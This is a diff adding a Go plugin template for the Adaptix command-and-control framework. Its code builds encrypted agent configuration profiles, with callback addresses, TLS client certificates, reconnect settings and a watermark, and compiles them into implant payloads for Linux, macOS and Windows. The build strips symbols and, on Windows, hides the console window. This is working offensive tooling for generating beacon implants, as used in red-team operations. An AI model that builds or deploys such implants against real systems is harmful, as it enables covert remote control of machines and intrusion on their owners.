@@ -1,0 +1,271 @@
+package main
+
+import (
+	"encoding/base64"
+	"encoding/hex"
+	"encoding/json"
+	"fmt"
+	"os"
+	"strconv"
+	"strings"
+
+	adaptix "github.com/Adaptix-Framework/axc2"
+)
+
+type GenerateConfig struct {
+	Os            string `json:"os"`
+	Arch          string `json:"arch"`
+	Win7support   bool   `json:"win7_support"`
+	ReconnTimeout string `json:"reconn_timeout"`
+	ReconnCount   int    `json:"reconn_count"`
+}
+
+var SrcPath = "src___NAME__"
+
+func (p *__NAME_CAP__Plugin) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
+	var (
+		agentProfiles  [][]byte
+		generateConfig GenerateConfig
+	)
+
+	if err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig); err != nil {
+		return nil, err
+	}
+
+	agentWatermark, err := strconv.ParseUint(AgentWatermark, 16, 32)
+	if err != nil {
+		return nil, err
+	}
+
+	connTimeout, err := parseGopherConnTimeout(generateConfig.ReconnTimeout)
+	if err != nil {
+		return nil, err
+	}
+
+	for _, transportProfile := range profile.ListenerProfiles {
+		ext := &__NAME_CAP__Extender{}
+		var listenerMap map[string]any
+		if err := json.Unmarshal(transportProfile.Profile, &listenerMap); err != nil {
+			return nil, err
+		}
+
+		encryptKeyHex, _ := listenerMap["encrypt_key"].(string)
+		encryptKey, err := hex.DecodeString(encryptKeyHex)
+		if err != nil {
+			return nil, err
+		}
+
+		addresses, err := parseGopherCallbackAddresses(listenerMap)
+		if err != nil {
+			return nil, err
+		}
+
+		useSSL, _ := listenerMap["ssl"].(bool)
+		clientCert, err := decodeOptionalGopherBase64(listenerMap, "client_cert")
+		if err != nil {
+			return nil, err
+		}
+		clientKey, err := decodeOptionalGopherBase64(listenerMap, "client_key")
+		if err != nil {
+			return nil, err
+		}
+		caCert, err := decodeOptionalGopherBase64(listenerMap, "ca_cert")
+		if err != nil {
+			return nil, err
+		}
+		banner, _ := listenerMap["tcp_banner"].(string)
+
+		profileData, err := Marshal(Profile{
+			Type:        uint(agentWatermark),
+			Addresses:   addresses,
+			BannerSize:  len(banner),
+			ConnTimeout: connTimeout,
+			ConnCount:   generateConfig.ReconnCount,
+			UseSSL:      useSSL,
+			SslCert:     clientCert,
+			SslKey:      clientKey,
+			CaCert:      caCert,
+			Sleep:       0,
+			Jitter:      0,
+			KillDate:    0,
+			WorkStart:   0,
+			WorkEnd:     0,
+		})
+		if err != nil {
+			return nil, err
+		}
+
+		encryptedProfile, err := ext.Encrypt(profileData, encryptKey)
+		if err != nil {
+			return nil, err
+		}
+
+		profileBlob := append(append([]byte{}, encryptKey...), encryptedProfile...)
+		agentProfiles = append(agentProfiles, []byte(bytesToEscapedProfile(profileBlob)))
+	}
+
+	return agentProfiles, nil
+}
+
+func parseGopherConnTimeout(raw string) (int, error) {
+	raw = strings.TrimSpace(raw)
+	if raw == "" {
+		return 10, nil
+	}
+	if secs, err := strconv.Atoi(raw); err == nil {
+		if secs > 0 {
+			return secs, nil
+		}
+		return 10, nil
+	}
+	secs, err := parseDurationToSeconds(raw)
+	if err != nil {
+		return 0, err
+	}
+	if secs <= 0 {
+		secs = 10
+	}
+	return secs, nil
+}
+
+func parseGopherCallbackAddresses(listenerMap map[string]any) ([]string, error) {
+	raw, _ := listenerMap["callback_addresses"].(string)
+	lines := strings.Split(strings.TrimSpace(raw), "\n")
+	addresses := make([]string, 0, len(lines))
+	for _, line := range lines {
+		line = strings.TrimSpace(line)
+		if line == "" {
+			continue
+		}
+		addresses = append(addresses, line)
+	}
+	if len(addresses) == 0 {
+		return nil, fmt.Errorf("callback_addresses must contain at least one host:port entry")
+	}
+	return addresses, nil
+}
+
+func decodeOptionalGopherBase64(listenerMap map[string]any, key string) ([]byte, error) {
+	raw, _ := listenerMap[key].(string)
+	raw = strings.TrimSpace(raw)
+	if raw == "" {
+		return nil, nil
+	}
+	decoded, err := base64.StdEncoding.DecodeString(raw)
+	if err != nil {
+		return nil, fmt.Errorf("decode %s: %w", key, err)
+	}
+	return decoded, nil
+}
+
+func bytesToEscapedProfile(data []byte) string {
+	var b strings.Builder
+	b.Grow(len(data) * 4)
+	for _, v := range data {
+		_, _ = fmt.Fprintf(&b, "\\x%02x", v)
+	}
+	return b.String()
+}
+
+func (p *__NAME_CAP__Plugin) BuildPayload(profile adaptix.BuildProfile, agentProfiles [][]byte) ([]byte, string, error) {
+	var (
+		Filename string
+		Payload  []byte
+	)
+
+	var (
+		generateConfig GenerateConfig
+		GoArch         string
+		GoOs           string
+		buildPath      string
+	)
+
+	err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig)
+	if err != nil {
+		return nil, "", err
+	}
+
+	currentDir := ModuleDir
+	tempDir, err := os.MkdirTemp("", "ax-*")
+	if err != nil {
+		return nil, "", err
+	}
+
+	switch generateConfig.Arch {
+	case "amd64":
+		GoArch = "amd64"
+	case "arm64":
+		GoArch = "arm64"
+	default:
+		_ = os.RemoveAll(tempDir)
+		return nil, "", fmt.Errorf("unsupported architecture: %s", generateConfig.Arch)
+	}
+
+	LdFlags := "-s -w"
+	switch generateConfig.Os {
+	case "linux":
+		GoOs = "linux"
+		Filename = "__NAME__.bin"
+	case "macos":
+		GoOs = "darwin"
+		Filename = "__NAME__.bin"
+	case "windows":
+		GoOs = "windows"
+		Filename = "__NAME__.exe"
+		LdFlags += " -H=windowsgui"
+	default:
+		_ = os.RemoveAll(tempDir)
+		return nil, "", fmt.Errorf("unsupported OS: %s", generateConfig.Os)
+	}
+	buildPath = tempDir + "/" + Filename
+
+	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO,
+		fmt.Sprintf("Target: %s/%s, Output: %s", GoOs, GoArch, Filename))
+
+	config := "package main\n\nvar encProfiles = [][]byte{\n"
+	for _, p := range agentProfiles {
+		config += fmt.Sprintf("\t[]byte(\"%s\"),\n", p)
+	}
+	config += "}\n"
+
+	configPath := currentDir + "/" + SrcPath + "/config.go"
+	err = os.WriteFile(configPath, []byte(config), 0644)
+	if err != nil {
+		_ = os.RemoveAll(tempDir)
+		return nil, "", err
+	}
+
+	cmdBuild := fmt.Sprintf("GOWORK=off CGO_ENABLED=0 GOOS=%s GOARCH=%s __BUILD_TOOL__ -trimpath -ldflags=\"%s\" -o %s",
+		GoOs, GoArch, LdFlags, buildPath)
+
+	if generateConfig.Os == "windows" && generateConfig.Win7support {
+		_, statErr := os.Stat("/usr/lib/go-win7/go")
+		if os.IsNotExist(statErr) {
+			_ = os.RemoveAll(tempDir)
+			return nil, "", fmt.Errorf("go-win7 not installed")
+		}
+		cmdBuild = fmt.Sprintf("GOWORK=off CGO_ENABLED=0 GOOS=%s GOARCH=%s GOROOT=/usr/lib/go-win7/ /usr/lib/go-win7/go build -trimpath -ldflags=\"%s\" -o %s",
+			GoOs, GoArch, LdFlags, buildPath)
+		_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Using go-win7 for Windows 7 support")
+	}
+
+	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Starting build process...")
+
+	err = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir+"/"+SrcPath, "sh", "-c", cmdBuild)
+	if err != nil {
+		_ = os.RemoveAll(tempDir)
+		return nil, "", err
+	}
+
+	Payload, err = os.ReadFile(buildPath)
+	if err != nil {
+		_ = os.RemoveAll(tempDir)
+		return nil, "", err
+	}
+	_ = os.RemoveAll(tempDir)
+
+	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO,
+		fmt.Sprintf("Payload size: %d bytes", len(Payload)))
+
+	return Payload, Filename, nil
+}
